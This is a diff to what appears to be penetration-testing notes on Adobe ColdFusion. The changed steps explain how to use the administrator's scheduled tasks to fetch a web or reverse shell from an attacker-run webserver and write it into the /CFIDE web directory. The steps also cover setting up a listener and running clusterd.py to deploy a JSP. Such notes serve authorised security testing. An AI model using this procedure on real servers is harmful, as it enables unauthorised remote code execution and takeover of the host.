@@ -313,7 +313,7 @@ The Adobe ColdFusion administrative interface allows for download and
 execution of scripts and binaries through scheduled tasks, effectively
 permitting system commands execution.
 
-As specified above `clustered` can be used to automaticly deploy a JSP
+As specified above `clustered` can be used to automatically deploy a JSP
 executable through the Task Scheduler functionality:
 
 ```
@@ -323,15 +323,15 @@ python clusterd.py -a coldfusion --deploy <JSP_FILE_PATH> --deployer schedule_jo
 To process to manually setup a scheduled task that will execute the specified
 binary is as follow:
 
-  1. Create a reverse shell executable  
+  1. Create a web / reverse shell executable in `cfm`, `jsp` or `exe` / `elf`  
      (Refer to the `[General] shells` note)
 
   2.
   a. Launch a webserver exposing the created reverse shell  
      (Refer to the `[General] File transfer` note)  
-  b. Setup a listener for the reverse shell connection
+  b. If needed, setup a listener for the reverse shell connection
 
-  3. Retrieve the system time at
+  3. Retrieve the system time in the Server Settings > Settings Summary
 
      ```
      <http | https>://<HOSTNAME | IP>/CFIDE/administrator/reports/index.cfm
@@ -344,6 +344,12 @@ binary is as follow:
 
      # Frequency
      "One-Time at" <SERVER_TIME + 1>
+
      # URL
      http://<WEBSERVER_IP>:<PORT>/<FILE>
+
+     # Check "Save output to a file"
+     # Find the ColdFusion mappings for the /CFIDE web directory in the settings summary and use the system directory for the file upload
      ```
+
+  5. Once the task has been executed, access the upload file at `/CFIDE/<FILENAME>`
